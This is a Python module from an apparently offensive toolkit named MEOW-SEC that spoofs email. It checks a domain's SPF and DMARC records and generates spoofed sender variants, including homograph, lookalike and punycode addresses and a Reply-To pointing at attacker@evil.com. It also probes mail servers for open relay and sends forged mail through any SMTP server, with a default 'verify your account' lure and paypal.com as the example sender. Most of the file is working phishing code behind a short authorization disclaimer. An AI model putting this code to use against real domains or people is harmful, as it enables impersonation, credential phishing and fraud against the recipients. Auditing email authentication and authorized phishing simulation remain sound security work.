# -*- coding: utf-8 -*-
"""
MEOW-SEC :: MAILSPOOF — Email Spoofing Toolkit
For authorized red team / phishing simulation / security awareness only.
"""
import os, json, smtplib, socket, re
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from core.ui import (console, ok, err, info, warn, find, show_module_banner,
                     ask_target, ask_choice, print_result_table, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

_DOH = "https://cloudflare-dns.com/dns-query"
_DOH_HDR = {"Accept": "application/dns-json"}

# ─── DNS helpers ──────────────────────────────────────────────

def _doh(name: str, rtype: str) -> list:
    if not HAS_REQUESTS:
        return []
    try:
        r = requests.get(_DOH, params={"name": name, "type": rtype},
                         headers=_DOH_HDR, timeout=8, verify=False)
        return [a["data"] for a in r.json().get("Answer", [])]
    except Exception:
        return []

def _get_mx(domain: str) -> str:
    records = _doh(domain, "MX")
    if not records:
        return ""
    # Sort by priority (format: "10 mail.domain.com")
    sorted_mx = sorted(records, key=lambda x: int(x.split()[0]) if x.split()[0].isdigit() else 99)
    return sorted_mx[0].split()[-1].rstrip(".") if sorted_mx else ""

def _get_txt(domain: str) -> list:
    return [r.strip('"') for r in _doh(domain, "TXT")]

def _spf_policy(domain: str) -> str:
    for txt in _get_txt(domain):
        if txt.lower().startswith("v=spf1"):
            if "+all" in txt: return "+all"
            if "~all" in txt: return "~all"
            if "?all" in txt: return "?all"
            if "-all" in txt: return "-all"
    return "none"

def _dmarc_policy(domain: str) -> str:
    for txt in _get_txt(f"_dmarc.{domain}"):
        if "v=DMARC1" in txt:
            m = re.search(r"\bp=(\w+)", txt, re.I)
            return m.group(1).lower() if m else "none"
    return "none"

# ─── SPOOFABILITY CHECK ───────────────────────────────────────

def _check_spoofable(domain: str) -> dict:
    spf   = _spf_policy(domain)
    dmarc = _dmarc_policy(domain)

    spoofable = False
    reason = []

    if spf in ("none", "~all", "?all", "+all"):
        spoofable = True
        if spf == "none":   reason.append("No SPF record")
        elif spf == "+all": reason.append("SPF +all (anyone can send)")
        elif spf == "~all": reason.append("SPF ~all (softfail, often delivered)")
        elif spf == "?all": reason.append("SPF ?all (neutral, no enforcement)")

    if dmarc in ("none", "none_missing"):
        spoofable = True
        if dmarc == "none": reason.append("DMARC p=none (no enforcement)")
        else: reason.append("No DMARC record")

    return {
        "domain":    domain,
        "spf":       spf,
        "dmarc":     dmarc,
        "spoofable": spoofable,
        "reason":    " · ".join(reason) if reason else "Protected",
    }

# ─── SPOOF VARIANTS GENERATOR ─────────────────────────────────

def gen_spoof_variants(sender_name: str, sender_domain: str, target_domain: str) -> list:
    """Generate spoofing technique variants without sending anything."""
    variants = []

    # 1. From = display name trick
    variants.append({
        "technique": "Display name spoof",
        "from_header": f'"{sender_name}" <noreply@{target_domain}.attacker.com>',
        "reply_to": None,
        "risk": "HIGH",
        "note": "Email client shows display name, not the actual address",
    })

    # 2. From = legit domain, Reply-To = attacker
    variants.append({
        "technique": "Reply-To hijack",
        "from_header": f'noreply@{sender_domain}',
        "reply_to": f'support@attacker-{sender_domain}.com',
        "risk": "HIGH",
        "note": "Reply goes to attacker, From looks legitimate",
    })

    # 3. Subaddressing trick
    variants.append({
        "technique": "Subaddressing",
        "from_header": f'security+{sender_domain}@gmail.com',
        "reply_to": None,
        "risk": "MEDIUM",
        "note": f"user+{sender_domain}@gmail.com — looks branded",
    })

    # 4. Unicode lookalike in display name
    variants.append({
        "technique": "Unicode display name",
        "from_header": f'"Ѕесurity Team <{sender_domain}>" <spoof@attacker.com>',
        "reply_to": None,
        "risk": "HIGH",
        "note": "Cyrillic Ѕ looks like S, embed real domain in display name",
    })

    # 5. Lookalike domain
    variants.append({
        "technique": "Lookalike domain",
        "from_header": f'noreply@{sender_domain.replace("o","0")}.com',
        "reply_to": None,
        "risk": "HIGH",
        "note": "Letter substitution: o→0",
    })

    # 6. Cousin domain (TLD swap)
    variants.append({
        "technique": "Cousin domain (TLD swap)",
        "from_header": f'support@{sender_domain}.co',
        "reply_to": None,
        "risk": "MEDIUM",
        "note": ".co instead of .com",
    })

    # 7. Punycode / IDN
    variants.append({
        "technique": "IDN / Punycode",
        "from_header": f'noreply@xn--{sender_domain}-nxa.com',
        "reply_to": None,
        "risk": "CRITICAL",
        "note": "Punycode encoding hides homograph in plain view",
    })

    # 8. From header spoofing (if SPF/DMARC not enforced)
    variants.append({
        "technique": "Direct From spoof (SPF/DMARC gap)",
        "from_header": f'security@{sender_domain}',
        "reply_to": f'attacker@evil.com',
        "risk": "CRITICAL",
        "note": f"Only works if SPF={_spf_policy(sender_domain)} and DMARC={_dmarc_policy(sender_domain)}",
    })

    return variants

# ─── SMTP SEND (with explicit consent prompt) ─────────────────

def _send_via_smtp(smtp_host: str, smtp_port: int, smtp_user: str, smtp_pass: str,
                   from_addr: str, reply_to: str, to_addr: str,
                   subject: str, body: str, use_tls: bool) -> bool:
    try:
        msg = MIMEMultipart("alternative")
        msg["From"]    = from_addr
        msg["To"]      = to_addr
        msg["Subject"] = subject
        if reply_to:
            msg["Reply-To"] = reply_to
        msg["X-Mailer"] = "MEOW-SEC Red Team"

        html_body = f"""<html><body style="font-family:Arial,sans-serif">
{body.replace(chr(10), '<br>')}
<br><br><small style="color:#666">This is an authorized security awareness test.</small>
</body></html>"""
        msg.attach(MIMEText(body, "plain"))
        msg.attach(MIMEText(html_body, "html"))

        if use_tls:
            with smtplib.SMTP_SSL(smtp_host, smtp_port, timeout=15) as s:
                s.login(smtp_user, smtp_pass)
                s.sendmail(from_addr.split("<")[-1].strip(">"), [to_addr], msg.as_string())
        else:
            with smtplib.SMTP(smtp_host, smtp_port, timeout=15) as s:
                s.ehlo()
                s.starttls()
                s.login(smtp_user, smtp_pass)
                s.sendmail(from_addr.split("<")[-1].strip(">"), [to_addr], msg.as_string())
        return True
    except Exception as e:
        err(f"SMTP error: {e}")
        return False

# ─── OPEN RELAY TEST ──────────────────────────────────────────

def _test_open_relay(mx_host: str, sender: str, recipient: str) -> dict:
    """Test if an MX server accepts relaying without authentication."""
    result = {"host": mx_host, "open_relay": False, "response": ""}
    try:
        with smtplib.SMTP(mx_host, 25, timeout=10) as s:
            s.ehlo("test.example.com")
            code, msg = s.mail(sender)
            if code == 250:
                code2, msg2 = s.rcpt(recipient)
                if code2 == 250:
                    result["open_relay"] = True
                    result["response"] = f"MAIL FROM 250 + RCPT TO {code2}"
                else:
                    result["response"] = f"RCPT TO rejected: {code2}"
            else:
                result["response"] = f"MAIL FROM rejected: {code}"
    except Exception as e:
        result["response"] = str(e)
    return result

# ─── SAVE ─────────────────────────────────────────────────────

def _save(domain: str, results: dict):
    os.makedirs("data", exist_ok=True)
    fname = f"data/mailspoof_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)
    ok(f"Saved → {fname}")

# ─── MAIN ─────────────────────────────────────────────────────

def run():
    show_module_banner("mailspoof")

    console.print(f"\n  [{CY}]Email Spoofing Toolkit[/]  [{DM}]— display name · reply-to · lookalike · open relay[/]\n")
    warn("Authorized red team / phishing simulation / security awareness ONLY.")
    console.print()

    console.print(f"  [{CY}]Mode:[/]")
    console.print(f"  [{G2}][1][/] Spoofability check (is the domain spoofable?)")
    console.print(f"  [{G2}][2][/] Generate spoofing variants (no sending)")
    console.print(f"  [{G2}][3][/] Test open relay on MX server")
    console.print(f"  [{G2}][4][/] Send spoofed test email via your SMTP")

    mode = ask_choice("Mode") or "1"

    sender_domain = ask_target("Sender domain to spoof (e.g. paypal.com)")
    if not sender_domain:
        return
    sender_domain = sender_domain.lower().strip().replace("https://","").replace("http://","").rstrip("/")

    all_data = {"sender_domain": sender_domain}

    if mode in ("1", "2", "3", "4"):
        console.print(f"\n  [{CY}]→ Spoofability check for {sender_domain}[/]")
        check = _check_spoofable(sender_domain)
        color = RD if check["spoofable"] else G1
        status = f"[{color}]{'SPOOFABLE' if check['spoofable'] else 'PROTECTED'}[/{color}]"
        console.print(f"  SPF:   [{CY}]{check['spf']}[/]")
        console.print(f"  DMARC: [{CY}]{check['dmarc']}[/]")
        console.print(f"  Status: {status}")
        if check["reason"] != "Protected":
            find(f"  Reason: {check['reason']}")
        all_data["spoofability"] = check

    if mode == "2":
        sender_name = ask_choice("Display name (e.g. PayPal Security)") or f"{sender_domain.split('.')[0].title()} Security"
        target_domain = ask_choice("Target domain (victim's domain, e.g. company.com)") or "victim.com"
        variants = gen_spoof_variants(sender_name, sender_domain, target_domain)
        console.print(f"\n  [{CY}]── {len(variants)} spoofing techniques ──[/]\n")
        for v in variants:
            color = RD if v["risk"] == "CRITICAL" else OR if v["risk"] == "HIGH" else CY
            console.print(f"  [{color}][{v['risk']}][/{color}]  [{G1}]{v['technique']}[/]")
            console.print(f"  [{DM}]  From: {v['from_header']}[/]")
            if v["reply_to"]:
                console.print(f"  [{DM}]  Reply-To: {v['reply_to']}[/]")
            console.print(f"  [{DM}]  ↳ {v['note']}[/]")
            console.print()
        all_data["variants"] = variants

    if mode == "3":
        mx = _get_mx(sender_domain)
        if not mx:
            err(f"No MX found for {sender_domain}"); return
        info(f"Testing MX: {mx}:25")
        test_sender = ask_choice(f"Test sender address [default: test@attacker.com]") or "test@attacker.com"
        test_rcpt   = ask_choice(f"Test recipient address [default: test@{sender_domain}]") or f"test@{sender_domain}"
        result = _test_open_relay(mx, test_sender, test_rcpt)
        if result["open_relay"]:
            find(f"OPEN RELAY on {mx} — accepts mail from {test_sender} to {test_rcpt}")
        else:
            ok(f"Not an open relay: {result['response']}")
        all_data["open_relay"] = result

    if mode == "4":
        warn("You must have authorization to send emails from this SMTP server.")
        console.print()
        smtp_host = ask_choice("SMTP host (e.g. smtp.gmail.com)") or ""
        smtp_port_s = ask_choice("SMTP port [default: 587]") or "587"
        smtp_port = int(smtp_port_s) if smtp_port_s.isdigit() else 587
        smtp_user = ask_choice("SMTP username (your email)") or ""
        smtp_pass = ask_choice("SMTP password") or ""
        from_addr = ask_choice(f"From: address (spoof this — e.g. security@{sender_domain})") or ""
        reply_to  = ask_choice("Reply-To: (attacker mailbox, or Enter to skip)") or ""
        to_addr   = ask_choice("Send to (target email address)") or ""
        subject   = ask_choice("Subject") or f"Security Alert — {sender_domain}"
        body      = ask_choice("Body (single line)") or "Please verify your account at the link below."
        use_tls_s = ask_choice("Use SSL on connect? [y/N]") or "n"
        use_tls   = use_tls_s.lower() == "y"

        if all([smtp_host, smtp_user, smtp_pass, from_addr, to_addr]):
            success = _send_via_smtp(smtp_host, smtp_port, smtp_user, smtp_pass,
                                     from_addr, reply_to or None, to_addr, subject, body, use_tls)
            if success:
                find(f"Email sent: From={from_addr} To={to_addr}")
                all_data["send"] = {"from": from_addr, "to": to_addr, "status": "sent"}
            else:
                err("Failed to send email")
        else:
            warn("Missing SMTP parameters — skipped send")

    console.print()
    _save(sender_domain, all_data)
